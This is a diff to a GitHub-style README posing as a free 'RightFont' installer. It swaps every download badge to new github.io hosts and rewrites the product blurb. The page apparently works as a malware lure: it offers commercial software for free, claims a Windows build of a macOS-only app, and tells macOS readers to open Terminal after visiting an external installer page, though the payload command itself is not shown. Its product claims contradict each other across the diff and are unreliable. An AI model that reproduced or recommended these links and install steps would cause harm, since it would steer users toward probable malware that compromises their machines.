@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Font+Manager-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 RightFont Free Installer** — RightFont is a lightweight font manager for macOS that provides fast font browsing, activation, and organization without heavy enterprise features. Works without internet access, no account required. Full offline installation.
+**💻 RightFont Free Installer** — RightFont is a professional font management application for macOS designed for designers. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install RightFont](https://img.shields.io/badge/⬇_Install_RightFont-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install RightFont](https://img.shields.io/badge/⬇_Install_RightFont-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About RightFont
 
-RightFont is a lightweight font manager for macOS that provides fast font browsing, activation, and organization without heavy enterprise features. Preview fonts with custom text, organize into groups, sync font collections with Dropbox or Google Drive, and use the menu bar quick-access for instant font lookup. RightFont's speed and simplicity make it ideal for individual designers who want font management without complexity.
+RightFont is a professional font management application for macOS designed for designers. Preview, organize, activate, and sync fonts with a beautiful interface. Integrates directly with Adobe Creative Suite applications allowing designers to activate fonts on-the-fly without leaving their design software. RightFont supports Google Fonts, Adobe Fonts, and local font libraries in one unified interface.
 
 ---
 
 ## ❌ Problem: RightFont is hard to access
 
 - **macOS Only** — No Windows version
-- **Commercial License** — Paid one-time purchase
-- **Enterprise Features** — Less capable than FontExplorer X for team or studio environments
-- **Auto-Activation** — Limited auto-activation plugin support compared to FontExplorer X
+- **Subscription Model** — Requires ongoing subscription for full features
+- **Adobe Dependency** — Best features tied to Adobe Creative Cloud workflow
+- **Sync Limitations** — Team font sharing requires higher-tier plan
 
 ---
 
@@ -61,9 +61,9 @@ RightFont is a lightweight font manager for macOS that provides fast font browsi
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ RightFont is a lightweight font manager for macOS that provides fast font browsi
 
 <div align="center">
 
-[![⬇ Install RightFont](https://img.shields.io/badge/⬇_Install_RightFont-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install RightFont](https://img.shields.io/badge/⬇_Install_RightFont-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ RightFont is a lightweight font manager for macOS that provides fast font browsi
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ RightFont is a lightweight font manager for macOS that provides fast font browsi
 
 ---
 
-**RightFont Free Installer** — RightFont is a lightweight font manager for macOS that provides fast font browsing, activation, and organization without heavy enterprise features. Install without internet connection today!
+**RightFont Free Installer** — RightFont is a professional font management application for macOS designed for designers. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install RightFont](https://img.shields.io/badge/⬇_Install_RightFont-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install RightFont](https://img.shields.io/badge/⬇_Install_RightFont-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
